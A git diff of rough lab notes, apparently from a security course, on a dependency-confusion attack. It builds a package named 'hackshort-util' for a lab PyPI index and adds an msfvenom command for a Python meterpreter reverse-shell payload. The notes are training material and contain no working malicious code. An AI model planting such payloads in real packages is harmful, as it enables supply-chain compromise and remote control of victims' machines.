@@ -1572,10 +1572,64 @@ cat -n  ~/.config/pip/pip.conf
 1. ==: This is the version matching clause. For example, if the requested package is some-package==1.0.0, only the 1.0.0 version would be downloaded. It's important to mention that wildcards can be used, so some-package==1.0.* would also match 1.0.0, 1.0.1, and so on.
 2. <=: This the version matching clause that would match any version equal or less than the specified version. For example, if some-package<=1.0.0 was requested, version 1.0.0, 0.0.9, and 0.8.9 would match, but 1.0.1 and 7.0.2 would not.
 3. >=: This the version matching clause that would match any version equal or greater than the specified version. This is the opposite of the <= clause.
-4. # no hash ~=: This is the compatible release clause, which will download any version that should be compatible with the requested version. This assumes that the developer versions the package according to the specification. For example, if some-package~=1.0.0 is requested, 1.0.1, 1.0.5, and 1.0.9 would all match, but 1.2.0 and 2.0.0 would not.
+4. ~=: This is the compatible release clause, which will download any version that should be compatible with the requested version. This assumes that the developer versions the package according to the specification. For example, if some-package~=1.0.0 is requested, 1.0.1, 1.0.5, and 1.0.9 would all match, but 1.2.0 and 2.0.0 would not.
 
-
-
-
+#### Creating Our Malicious Package
+- Now that we know the name of the package, how it's imported, and the version of the package we should try using, we next need to build and publish the package to pypi.offseclab.io. At a minimum, a Python package typically consists of two files and two directories.
+```bash
+└── hackshort-util
+    ├── setup.py
+    └── hackshort_util
+        └── __init__.py
+```
+- The root directory will be the name of the package, in this case, hackshort-util.
+- In that directory, we'll find setup.py, which is the setup script. This script will build, distribute, and install the module with [setuptools](https://setuptools.pypa.io/en/latest/). In this file, we will define the package and how to install it.
+> Instead of setup.py, we can also use pyproject.toml or setup.cfg.
+- Next, we have the hackshort_util directory. As stated earlier, Python syntax does not handle dashes well in package names, so the dash is replaced with an underscore. This will be the name that is used when importing the module into an application. As we found in the forum post, the module name was hackshort_util.
+- Finally, we have a __init__.py file. This file is used to indicate that the directory is a Python module. While no longer needed if using a namespace package, we're going to create a regular package, which does require it.
+- Let's create a very basic Python package that we can install locally to test out. We'll create the hackshort-util directory and the hackshort_util subdirectory using mkdir. Next, we can create setup.py using nano. Finally, we'll use touch to create an empty __init__.py file.
+```bash
+mkdir hackshort-util
+cd hackshort-util
+nano setup.py
+cat -n setup.py # Below is code 
+01  from setuptools import setup, find_packages
+02
+03  setup(
+04      name='hackshort-util',
+05      version='1.1.4',
+06      packages=find_packages(),
+07      classifiers=[],
+08      install_requires=[],
+09      tests_require=[],
+10  )
+mkdir hackshort_util
+touch hackshort_util/__init__.py
+```
+> A source distribution is a collection of all of the files that comprise a Python package.
+```bash
+python3 ./setup.py sdist
+/usr/lib/python3/dist-packages/setuptools/_distutils/dist.py:261: UserWarning: Unknown distribution option: 'tests_require'
+  warnings.warn(msg)
+----------  TRUNKATED
+creating dist
+Creating tar archive
+removing 'hackshort_util-1.1.4' (and everything under it)
+```
+- When we ran this command, Python packaged up the source of our custom package. It also created various metadata files (egg-info); however, that's not important for us. The actual package was saved in the dist folder with the name hackshort-util-1.1.4.tar.gz.
+- Let's use pip install to install our package and check if it works. Instead of providing pip a package name to search the remote repositories, we'll provide it with a direct filesystem path to our package.
+```bash
+source /home/kali/HTB/HTB/Chaos/myenv/bin/activate
+(myenv)> pip install ./dist/hackshort_util-1.1.4.tar.gz    
+Looking in indexes: http://pypi.offseclab.io
+----------  TRUNKATED
+Successfully installed hackshort-util-1.1.4
+```
+- The installation was successful! Next, let's attempt to import hackshort_util. Although the package does not contain anything of value, we should be able import it. However, if we attempt to import the hackshort_util package from the current directory, the hackshort_util directory will be used instead of the package we just installed. Instead, we'll open a new terminal tab and run python3 from our home directory. While this is a small detail, since the source should be the same regardless, we always want to make sure we're testing the build in case something is misconfigured.
+### Not able to perporm
+```bash
+msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.88.99.76 LPORT=4488
+```
+Here they they creating the payload with msfvenom, adding into util.py then cloud kali to exploiting with metasploit
 # Special Thanks to the Creator of tools and Community
 [![](https://github.com/WithSecureLabs.png?size=50)](https://github.com/WithSecureLabs)
